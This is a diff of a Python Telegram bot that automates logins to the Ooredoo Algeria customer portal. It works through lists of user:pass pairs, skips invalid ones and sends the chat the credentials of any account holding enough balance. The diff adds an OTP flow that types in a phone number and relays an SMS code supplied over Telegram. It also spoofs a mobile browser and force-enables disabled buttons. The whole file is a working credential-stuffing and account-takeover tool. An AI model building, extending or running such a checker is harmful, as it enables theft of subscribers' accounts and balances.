@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Ooredoo Railway Bot - skips ANY validation error, goes to next account
+Ooredoo Bot
+- user:pass (من ملف) → فحص عادي
+- رقم فقط (من رسالة) → OTP flow
 """
 
 import os
 import re
-import sys
 import time
 import asyncio
 import logging
-from pathlib import Path
 
 from dotenv import load_dotenv
 from playwright.async_api import async_playwright
@@ -29,6 +29,7 @@ MIN_BALANCE = int(os.getenv("MIN_BALANCE", "100"))
 HEADLESS = os.getenv("HEADLESS", "true").lower() == "true"
 RETRY_DELAY = 3
 
+HOME_URL = "https://my.ooredoo.dz/"
 SIGNIN_URL = "https://my.ooredoo.dz/sign-in"
 
 logging.basicConfig(level=logging.INFO,
@@ -52,7 +53,16 @@ def log_to_file(msg, level="INFO"):
         pass
 
 
-state = {"running": False, "stop": False, "stats": None}
+# حالة عامة
+state = {
+    "running": False,
+    "stop": False,
+    "stats": None,
+    # OTP flow
+    "otp_waiting": False,
+    "otp_future": None,
+    "otp_chat": None,
+}
 
 
 class Stats:
@@ -92,14 +102,6 @@ class Stats:
             f"⏱️ المدة: <b>{self.elapsed()}</b>"
         )
 
-    def hits_text(self):
-        if not self.hits:
-            return "ما كاينش حسابات مؤهلة."
-        lines = ["💰 <b>الحسابات المؤهلة:</b>", "━━━━━━━━━━━━━━━━━"]
-        for i, (u, p, b) in enumerate(self.hits, 1):
-            lines.append(f"<b>{i}.</b> <code>{u}:{p}</code> → <b>{b}</b> دج")
-        return "\n".join(lines)
-
 
 def parse_accounts(text):
     out = []
@@ -115,6 +117,17 @@ def parse_accounts(text):
         if user and pwd:
             out.append((user, pwd))
     return out
+
+
+def is_single_phone(text):
+    """نتحققو إذا الرسالة هي رقم فقط"""
+    text = text.strip()
+    if not text or ":" in text or " " in text:
+        return False
+    digits = re.sub(r"\D", "", text)
+    if len(digits) < 9 or len(digits) > 13:
+        return False
+    return True
 
 
 def find_balance_in_text(text):
@@ -135,19 +148,16 @@ def find_balance_in_text(text):
 
 
 def is_invalid_creds(text):
-    """كل الأخطاء اللي تخلي البوت يتخطى الحساب"""
     if not text:
         return False
     t = text.lower()
     return any(p in t for p in [
-        # بيانات دخول
         "identifiants non valides",
         "identifiants incorrects",
         "invalid user credentials",
         "invalid credentials",
         "mot de passe incorrect",
         "utilisateur non trouvé",
-        # صيغة الرقم
         "numéro de téléphone non valide",
         "numéro non valide",
         "numéro invalide",
@@ -157,7 +167,6 @@ def is_invalid_creds(text):
         "email invalide",
         "email invalid",
         "invalid email",
-        # عامة
         "compte non trouvé",
         "compte introuvable",
         "utilisateur inconnu",
@@ -166,6 +175,257 @@ def is_invalid_creds(text):
     ])
 
 
+# ============================================================
+#  OTP Flow - رقم فقط
+# ============================================================
+async def run_otp_flow(app, chat_id, phone):
+    bot = app.bot
+
+    await bot.send_message(chat_id=chat_id,
+        text=f"📱 <b>OTP Flow</b>\nالرقم: <code>{phone}</code>\n"
+             f"راح نفتحو الصفحة ونجربو...",
+        parse_mode="HTML")
+
+    async with async_playwright() as p:
+        browser = await p.chromium.launch(headless=HEADLESS,
+            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"])
+        ctx = await browser.new_context(
+            locale="fr-FR",
+            viewport={"width": 412, "height": 915},
+            user_agent=("Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 "
+                        "(KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36"),
+        )
+        page = await ctx.new_page()
+
+        try:
+            # 1) نفتحو الصفحة الرئيسية
+            await bot.send_message(chat_id=chat_id,
+                text="🌐 نفتحو my.ooredoo.dz...")
+            await page.goto(HOME_URL, wait_until="domcontentloaded", timeout=60000)
+            await page.wait_for_timeout(4000)
+
+            # 2) ننتظرو حقل الرقم
+            try:
+                await page.wait_for_selector("input[placeholder*='05']", timeout=15000)
+            except Exception:
+                pass
+
+            # 3) نصوّرو الصفحة
+            await page.screenshot(path="/tmp/otp_step1.png", full_page=True)
+            with open("/tmp/otp_step1.png", "rb") as f:
+                await bot.send_photo(chat_id=chat_id, photo=f,
+                    caption="📸 الصفحة الرئيسية", parse_mode="HTML")
+
+            # 4) نكتبو الرقم
+            ok = False
+            try:
+                loc = page.locator("input[placeholder*='05'], input[type='number'], input[inputmode='tel']").first
+                if await loc.count() > 0:
+                    await loc.click(timeout=5000)
+                    await page.wait_for_timeout(200)
+                    await page.keyboard.press("Control+A")
+                    await page.keyboard.press("Delete")
+                    await page.keyboard.type(phone, delay=80)
+                    await page.wait_for_timeout(500)
+                    val = await loc.input_value()
+                    if val:
+                        ok = True
+                        log_to_file(f"OTP: filled {phone}")
+            except Exception as e:
+                log_to_file(f"OTP fill failed: {e}", "ERROR")
+
+            if not ok:
+                await bot.send_message(chat_id=chat_id,
+                    text="❌ ما قدرناش نكتبو الرقم")
+                await browser.close()
+                return
+
+            # 5) نصوّرو بعد الكتابة
+            await page.screenshot(path="/tmp/otp_step2.png", full_page=True)
+            with open("/tmp/otp_step2.png", "rb") as f:
+                await bot.send_photo(chat_id=chat_id, photo=f,
+                    caption=f"📸 بعد كتابة الرقم <code>{phone}</code>",
+                    parse_mode="HTML")
+
+            # 6) نضغطو زر "Accéder avec le numéro"
+            clicked = False
+            try:
+                btn = page.get_by_role("button",
+                    name=re.compile("acc[ée]der|num[ée]ro", re.I))
+                if await btn.count() > 0:
+                    await btn.first.click(timeout=5000)
+                    clicked = True
+                    log_to_file("OTP: clicked access button")
+            except Exception as e:
+                log_to_file(f"OTP button click: {e}", "WARN")
+
+            if not clicked:
+                # نجربو JS
+                try:
+                    clicked = bool(await page.evaluate("""
+                        () => {
+                            const btns = [...document.querySelectorAll('button')];
+                            const t = btns.find(b =>
+                                /acc[ée]der/i.test(b.textContent || '') &&
+                                /num[ée]ro/i.test(b.textContent || '')
+                            );
+                            if (!t) return false;
+                            t.removeAttribute('disabled');
+                            t.disabled = false;
+                            t.click();
+                            return true;
+                        }
+                    """))
+                except Exception:
+                    pass
+
+            if not clicked:
+                await bot.send_message(chat_id=chat_id,
+                    text="❌ ما لقيناش زر الدخول")
+                await browser.close()
+                return
+
+            # 7) نستنو صفحة OTP
+            await page.wait_for_timeout(5000)
+
+            # نصوّرو
+            await page.screenshot(path="/tmp/otp_step3.png", full_page=True)
+            with open("/tmp/otp_step3.png", "rb") as f:
+                await bot.send_photo(chat_id=chat_id, photo=f,
+                    caption="📸 الصفحة بعد الضغط — تأكد من OTP",
+                    parse_mode="HTML")
+
+            # 8) نطلب الرمز من المستخدم
+            loop = asyncio.get_event_loop()
+            fut = loop.create_future()
+            state["otp_waiting"] = True
+            state["otp_future"] = fut
+            state["otp_chat"] = chat_id
+
+            await bot.send_message(chat_id=chat_id,
+                text="🔐 <b>ابعتلي رمز OTP</b> (اللي جاك في SMS)",
+                parse_mode="HTML")
+
+            try:
+                otp_code = await asyncio.wait_for(fut, timeout=300)
+            except asyncio.TimeoutError:
+                await bot.send_message(chat_id=chat_id, text="⏰ ما جاش الرمز.")
+                await browser.close()
+                return
+            finally:
+                state["otp_waiting"] = False
+                state["otp_future"] = None
+                state["otp_chat"] = None
+
+            log_to_file(f"OTP code received: {otp_code}")
+
+            # 9) نكتبو الرمز
+            otp_filled = False
+            try:
+                # ندورو على حقول OTP (عدة input)
+                inputs = await page.locator("input[type='tel'], input[type='number'], input[inputmode='numeric'], input[type='text']").all()
+                if len(inputs) >= 4:
+                    # OTP من 4-6 خانات
+                    for i, ch in enumerate(otp_code[:len(inputs)]):
+                        try:
+                            await inputs[i].fill(ch)
+                            await page.wait_for_timeout(100)
+                        except Exception:
+                            pass
+                    otp_filled = True
+                elif len(inputs) == 1:
+                    await inputs[0].fill(otp_code)
+                    otp_filled = True
+            except Exception as e:
+                log_to_file(f"OTP fill: {e}", "ERROR")
+
+            if not otp_filled:
+                # نجربو بالـ keyboard
+                try:
+                    await page.keyboard.type(otp_code, delay=100)
+                    otp_filled = True
+                except Exception:
+                    pass
+
+            await page.wait_for_timeout(500)
+
+            # 10) نصوّرو
+            await page.screenshot(path="/tmp/otp_step4.png", full_page=True)
+            with open("/tmp/otp_step4.png", "rb") as f:
+                await bot.send_photo(chat_id=chat_id, photo=f,
+                    caption=f"📸 بعد كتابة الرمز <code>{otp_code}</code>",
+                    parse_mode="HTML")
+
+            # 11) نضغطو زر التحقق
+            try:
+                btn = page.get_by_role("button",
+                    name=re.compile("valider|v[ée]rifier|confirmer|suivant|continuer", re.I))
+                if await btn.count() > 0:
+                    await btn.first.click(timeout=5000)
+            except Exception:
+                try:
+                    await page.evaluate("""
+                        () => {
+                            const btns = [...document.querySelectorAll('button')];
+                            const t = btns.find(b =>
+                                /valider|v[ée]rifier|confirmer|suivant|continuer/i.test(b.textContent || '')
+                            );
+                            if (t) {
+                                t.removeAttribute('disabled');
+                                t.disabled = false;
+                                t.click();
+                            }
+                        }
+                    """)
+                except Exception:
+                    pass
+
+            # 12) نستنو النتيجة
+            await page.wait_for_timeout(8000)
+            try:
+                await page.wait_for_load_state("networkidle", timeout=30000)
+            except Exception:
+                pass
+
+            # 13) نصوّرو الصفحة النهائية
+            await page.screenshot(path="/tmp/otp_final.png", full_page=True)
+            with open("/tmp/otp_final.png", "rb") as f:
+                await bot.send_photo(chat_id=chat_id, photo=f,
+                    caption="📸 الصفحة النهائية", parse_mode="HTML")
+
+            # 14) نقراو الرصيد
+            try:
+                body = await page.inner_text("body")
+            except Exception:
+                body = ""
+
+            bal = find_balance_in_text(body)
+            log_to_file(f"OTP final balance: {bal}")
+
+            if bal is not None:
+                await bot.send_message(chat_id=chat_id,
+                    text=f"💰 <b>الرصيد: {bal} دج</b>\n"
+                         f"📱 <code>{phone}</code>",
+                    parse_mode="HTML")
+            else:
+                await bot.send_message(chat_id=chat_id,
+                    text="⚠️ دخلنا لكن ما لقيناش الرصيد — شوف الصورة",
+                    parse_mode="HTML")
+
+        except Exception as e:
+            log_to_file(f"OTP flow exception: {e}", "ERROR")
+            await bot.send_message(chat_id=chat_id, text=f"❌ خطأ: <code>{e}</code>",
+                                    parse_mode="HTML")
+        finally:
+            try:
+                await browser.close()
+            except Exception:
+                pass
+
+
+# ============================================================
+#  Username Flow - العادي
+# ============================================================
 async def wait_page_ready(page, timeout=30):
     start = time.time()
     while time.time() - start < timeout:
@@ -205,8 +465,7 @@ async def fill_username(page, username):
         await page.wait_for_timeout(300)
 
         return await loc.input_value() == username
-    except Exception as e:
-        log_to_file(f"  fill_username failed: {e}", "ERROR")
+    except Exception:
         return False
 
 
@@ -228,8 +487,7 @@ async def fill_password(page, password):
         await page.wait_for_timeout(300)
 
         return await loc.input_value() == password
-    except Exception as e:
-        log_to_file(f"  pwd failed: {e}", "ERROR")
+    except Exception:
         return False
 
 
@@ -249,8 +507,8 @@ async def click_connexion(page):
             except Exception:
                 await el.click(force=True)
                 return True
-    except Exception as e:
-        log_to_file(f"  click failed: {e}", "ERROR")
+    except Exception:
+        pass
 
     try:
         ok = await page.evaluate("""
@@ -335,7 +593,6 @@ async def wait_for_result(page, timeout=60):
 
     while time.time() - start < timeout:
         if page.url != last_url:
-            log_to_file(f"URL: {last_url} -> {page.url}")
             if "/sign-in" not in page.url and "/login" not in page.url:
                 return {"status": "success", "url": page.url}
             last_url = page.url
@@ -417,7 +674,6 @@ async def try_account(browser, user, pwd, bot, chat_id):
             return {"status": "retry", "msg": "click"}
 
         result = await wait_for_result(page, timeout=60)
-        log_to_file(f"Result for {user}: {result}")
 
         try:
             await page.screenshot(path="/tmp/after.png", full_page=False)
@@ -437,17 +693,15 @@ async def try_account(browser, user, pwd, bot, chat_id):
         if result["status"] == "error":
             err = result["error"]
             await ctx.close()
-
             if is_invalid_creds(err):
                 return {"status": "invalid", "msg": err}
-
             return {"status": "error", "msg": err, "stop": True}
 
         await ctx.close()
         return {"status": "retry", "msg": "timeout"}
 
     except Exception as e:
-        log_to_file(f"try_account exception: {e}", "ERROR")
+        log_to_file(f"try_account: {e}", "ERROR")
         try:
             await ctx.close()
         except Exception:
@@ -462,9 +716,8 @@ async def run_check(app, chat_id, accounts):
     bot = app.bot
 
     await bot.send_message(chat_id=chat_id,
-        text=(f"🚀 <b>بداية</b>\nعدد: <b>{len(accounts)}</b>\n"
-              f"الحد: <b>{MIN_BALANCE}</b> دج\n"
-              f"♻️ يتخطى أي خطأ ويمشي للتالي"),
+        text=f"🚀 <b>بداية</b>\nعدد: <b>{len(accounts)}</b>\n"
+             f"♻️ يتخطى أي خطأ",
         parse_mode="HTML")
 
     async with async_playwright() as p:
@@ -473,7 +726,6 @@ async def run_check(app, chat_id, accounts):
         try:
             for idx, (user, pwd) in enumerate(accounts, 1):
                 if state["stop"]:
-                    await bot.send_message(chat_id=chat_id, text="⏹️ توقف.")
                     break
 
                 await bot.send_message(chat_id=chat_id,
@@ -510,12 +762,11 @@ async def run_check(app, chat_id, accounts):
                             stats.no_balance += 1
                         elif bal >= MIN_BALANCE:
                             stats.hit += 1
-                            stats.hits.append((user, pwd, bal))
                             await bot.send_message(chat_id=chat_id,
-                                text=(f"💰 <b>مؤهل!</b>\n"
-                                      f"👤 <code>{user}</code>\n"
-                                      f"🔑 <code>{pwd}</code>\n"
-                                      f"💵 <b>{bal}</b> دج"),
+                                text=f"💰 <b>مؤهل!</b>\n"
+                                     f"👤 <code>{user}</code>\n"
+                                     f"🔑 <code>{pwd}</code>\n"
+                                     f"💵 <b>{bal}</b> دج",
                                 parse_mode="HTML")
                         else:
                             await bot.send_message(chat_id=chat_id,
@@ -526,11 +777,8 @@ async def run_check(app, chat_id, accounts):
                     if r["status"] == "invalid":
                         stats.invalid += 1
                         stats.done += 1
-                        log_to_file(f"INVALID for {user} → skip")
                         await bot.send_message(chat_id=chat_id,
-                            text=f"❌ <code>{user}</code>\n"
-                                 f"<i>{r.get('msg', 'invalid')}</i>\n"
-                                 f"♻️ نروحو للتالي",
+                            text=f"❌ <code>{user}</code> → التالي",
                             parse_mode="HTML")
                         break
 
@@ -539,20 +787,14 @@ async def run_check(app, chat_id, accounts):
 
                 if attempts >= max_attempts and r.get("status") == "retry":
                     stats.done += 1
-                    await bot.send_message(chat_id=chat_id,
-                        text=f"⏭️ <code>{user}</code> — بعد {attempts} محاولات",
-                        parse_mode="HTML")
 
                 if state["stop"]:
                     break
-
         finally:
             await browser.close()
 
     try:
         await bot.send_message(chat_id=chat_id, text=stats.summary(), parse_mode="HTML")
-        if stats.hits:
-            await bot.send_message(chat_id=chat_id, text=stats.hits_text(), parse_mode="HTML")
     except Exception:
         pass
 
@@ -560,10 +802,15 @@ async def run_check(app, chat_id, accounts):
     state["stop"] = False
 
 
+# ============================================================
+#  Telegram Handlers
+# ============================================================
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🚀 بوت Ooredoo\n\nابعتلي ملف\n"
-        "♻️ يتخطى أي خطأ ويمشي للتالي\n\n"
+        "🚀 <b>بوت Ooredoo</b>\n\n"
+        "📁 <b>ابعتلي ملف</b> <code>accounts.txt</code> (user:pass) → فحص عادي\n\n"
+        "📱 <b>ولا ابعتلي رقم فقط</b> → OTP flow\n"
+        "   مثال: <code>0553372434</code>\n\n"
         "/start /status /stop /log",
         parse_mode="HTML")
 
@@ -573,8 +820,10 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         s = state["stats"]
         await update.message.reply_text(
             f"⏳ {s.done}/{s.total}\n"
-            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid} | 🔄 {s.retries}",
+            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid}",
             parse_mode="HTML")
+    elif state["otp_waiting"]:
+        await update.message.reply_text("🔐 نستنو رمز OTP...")
     else:
         await update.message.reply_text("✅ جاهز.")
 
@@ -590,6 +839,8 @@ async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state["stop"] = True
+    if state["otp_future"] and not state["otp_future"].done():
+        state["otp_future"].cancel()
     await update.message.reply_text("⏹️")
 
 
@@ -620,11 +871,22 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.id != TELEGRAM_CHAT_ID:
         return
+
     text = update.message.text.strip()
+
+    # 🔐 إذا كنا نستنو OTP
+    if state["otp_waiting"] and state["otp_future"] and not state["otp_future"].done():
+        state["otp_future"].set_result(text)
+        await update.message.reply_text(f"✅ توصلنا: <code>{text}</code>",
+                                          parse_mode="HTML")
+        return
+
     if text.startswith("/"):
         return
+
+    # 📁 file content pasted? أو حساب واحد
     accounts = parse_accounts(text)
-    if accounts:
+    if accounts and len(accounts) > 0:
         if state["running"]:
             await update.message.reply_text("⚠️ فحص جاري.")
             return
@@ -633,8 +895,23 @@ async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"📄 {len(accounts)} حساب.", parse_mode="HTML")
         asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))
-    else:
-        await update.message.reply_text("💡 ابعتلي ملف.")
+        return
+
+    # 📱 رقم فقط → OTP
+    if is_single_phone(text):
+        if state["running"]:
+            await update.message.reply_text("⚠️ فحص جاري.")
+            return
+        state["running"] = True
+        state["stop"] = False
+        asyncio.create_task(run_otp_flow(ctx.application, update.effective_chat.id, text))
+        return
+
+    await update.message.reply_text(
+        "💡 ابعتلي:\n"
+        "• ملف <code>accounts.txt</code> (user:pass)\n"
+        "• رقم فقط (مثال: 0553372434) → OTP flow",
+        parse_mode="HTML")
 
 
 def main():
